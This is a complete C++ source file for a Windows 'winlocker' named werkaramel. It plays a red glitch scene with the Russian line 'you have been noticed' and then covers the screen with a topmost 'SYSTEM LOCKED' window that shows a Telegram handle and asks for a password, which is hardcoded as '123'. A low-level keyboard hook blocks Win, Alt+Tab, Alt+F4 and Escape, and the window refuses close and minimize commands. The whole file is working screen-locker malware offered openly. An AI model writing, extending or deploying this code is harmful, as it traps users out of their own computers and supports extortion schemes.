// language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
// werkaramel — fast glitch + banner + winlocker
#include <windows.h>
#include <windowsx.h>
#include <string>
#include <thread>
#include <chrono>

const std::wstring PASS = L"123";

std::wstring g_input;
bool g_unlocked = false;
bool g_wrong = false;
HHOOK g_kbHook = nullptr;
HANDLE g_hOut = INVALID_HANDLE_VALUE;

const COLORREF L_BG     = RGB(0, 0, 0);
const COLORREF L_FG     = RGB(255, 255, 255);
const COLORREF L_DIM    = RGB(90, 90, 90);
const COLORREF L_ACCENT = RGB(200, 30, 30);

void WOut(const std::wstring& s) {
    DWORD written = 0;
    WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &written, nullptr);
}

void SetConsoleColor(WORD attr) {
    SetConsoleTextAttribute(g_hOut, attr);
}

void Gotoxy(int x, int y) {
    COORD c{ (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(g_hOut, c);
}

void DrawBanner() {
    const wchar_t* banner[] = {
        L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
        L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
        L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
        L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
        L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
        L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
    };

    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    int baseY = 8;
    for (int i = 0; i < 6; ++i) {
        Gotoxy(4, baseY + i);
        WOut(banner[i]);
    }

    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    Gotoxy(4, baseY + 8);
    WOut(L"╔═════════════════════════════════════════════════════════════════════════════╗");
    Gotoxy(4, baseY + 9);
    WOut(L"║                          W I N L O C K E R                                  ║");
    Gotoxy(4, baseY + 10);
    WOut(L"╚═════════════════════════════════════════════════════════════════════════════╝");
}

void FastGlitch() {
    for (int i = 0; i < 3; ++i) {
        system("color 4F");
        std::this_thread::sleep_for(std::chrono::milliseconds(60));
        system("color 0F");
        std::this_thread::sleep_for(std::chrono::milliseconds(60));
    }
}

void RunConsoleScene() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    HWND con = GetConsoleWindow();
    SetWindowPos(con, HWND_TOP, 100, 100, 1000, 800, 0);

    CONSOLE_FONT_INFOEX cfi{};
    cfi.cbSize = sizeof(cfi);
    cfi.dwFontSize.Y = 18;
    cfi.dwFontSize.X = 9;
    wcscpy_s(cfi.FaceName, L"Consolas");
    SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);

    // чёрный фон
    system("color 0F");
    system("cls");

    // 1. быстрый глитч
    FastGlitch();

    // 2. вас заметили
    system("color 4F");
    system("cls");

    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE
                    | FOREGROUND_INTENSITY);
    Gotoxy(8, 3);
    WOut(L">>> ВАС ЗАМЕТИЛИ <<<");

    std::this_thread::sleep_for(std::chrono::milliseconds(600));

    // 3. снова быстрый глитч
    FastGlitch();

    // 4. баннер
    system("color 0F");
    system("cls");
    DrawBanner();

    // 5. пауза 1 секунда
    std::this_thread::sleep_for(std::chrono::seconds(1));
}

LRESULT CALLBACK KbHook(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && !g_unlocked) {
        auto* kb = (KBDLLHOOKSTRUCT*)lp;
        DWORD vk = kb->vkCode;
        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
        if (vk == VK_ESCAPE) return 1;
        if (vk == VK_F11) return 1;
    }
    return CallNextHookEx(g_kbHook, code, wp, lp);
}

void DrawTextEx(HDC dc, int x, int y, const wchar_t* s, COLORREF c,
                int size, bool center, int winW) {
    HFONT font = CreateFontW(size, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                             CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                             DEFAULT_PITCH, L"Consolas");
    HFONT old = (HFONT)SelectObject(dc, font);
    SetTextColor(dc, c);
    SetBkMode(dc, TRANSPARENT);
    if (center) {
        SIZE sz;
        GetTextExtentPoint32W(dc, s, (int)wcslen(s), &sz);
        x = (winW - sz.cx) / 2;
    }
    TextOutW(dc, x, y, s, (int)wcslen(s));
    SelectObject(dc, old);
    DeleteObject(font);
}

void LockerPaint(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC dc = BeginPaint(hwnd, &ps);
    RECT rc; GetClientRect(hwnd, &rc);

    HBRUSH bg = CreateSolidBrush(L_BG);
    FillRect(dc, &rc, bg);
    DeleteObject(bg);

    int cx = rc.right / 2;

    DrawTextEx(dc, 0, 180, L"SYSTEM LOCKED", L_ACCENT, 72, true, rc.right);
    DrawTextEx(dc, 0, 280, L"enter password to continue", L_DIM, 22, true, rc.right);
    DrawTextEx(dc, 0, 320, L"tg: @werkaramel", L_ACCENT, 28, true, rc.right);

    RECT box{ cx - 250, 400, cx + 250, 460 };
    HBRUSH bf = CreateSolidBrush(RGB(15, 15, 15));
    FillRect(dc, &box, bf);
    DeleteObject(bf);
    FrameRect(dc, &box, (HBRUSH)GetStockObject(WHITE_BRUSH));

    std::wstring masked(g_input.size(), L'*');
    DrawTextEx(dc, cx - 230, 418, masked.c_str(), L_FG, 26, false, 0);

    if (g_wrong) {
        DrawTextEx(dc, 0, 500, L"wrong password", L_ACCENT, 24, true, rc.right);
    } else {
        DrawTextEx(dc, 0, 500, L"[ Enter ]  unlock", L_DIM, 20, true, rc.right);
    }

    EndPaint(hwnd, &ps);
}

LRESULT CALLBACK LockerProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: LockerPaint(hwnd); return 0;

    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetKeyState(VK_MENU) & 0x8000)) return 0;
        if (wp == VK_ESCAPE) return 0;
        return 0;

    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        if ((wp & 0xFFF0) == SC_MINIMIZE) return 0;
        if ((wp & 0xFFF0) == SC_TASKLIST) return 0;
        if ((wp & 0xFFF0) == SC_KEYMENU) return 0;
        return 0;

    case WM_CLOSE: return 0;

    case WM_CHAR:
        if (wp == VK_BACK) {
            if (!g_input.empty()) g_input.pop_back();
            g_wrong = false;
        } else if (wp == VK_RETURN) {
            if (g_input == PASS) {
                g_unlocked = true;
                UnhookWindowsHookEx(g_kbHook);
                PostQuitMessage(0);
            } else {
                g_input.clear();
                g_wrong = true;
                MessageBeep(MB_ICONHAND);
            }
        } else if (wp >= 32) {
            g_input.push_back((wchar_t)wp);
            g_wrong = false;
        }
        InvalidateRect(hwnd, nullptr, FALSE);
        return 0;

    case WM_DESTROY:
        UnhookWindowsHookEx(g_kbHook);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

void RunLocker(HINSTANCE hi) {
    WNDCLASSW wc{};
    wc.lpfnWndProc   = LockerProc;
    wc.hInstance     = hi;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"werkaramel_locker";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST, L"werkaramel_locker", L"System Locked",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, hi, nullptr);

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    ShowWindow(hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(hwnd);
    SetFocus(hwnd);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, KbHook, hi, 0);

    MSG m;
    while (GetMessageW(&m, nullptr, 0, 0)) {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
}

int wmain() {
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    RunConsoleScene();
    HINSTANCE hi = GetModuleHandleW(nullptr);
    RunLocker(hi);
    return 0;
}
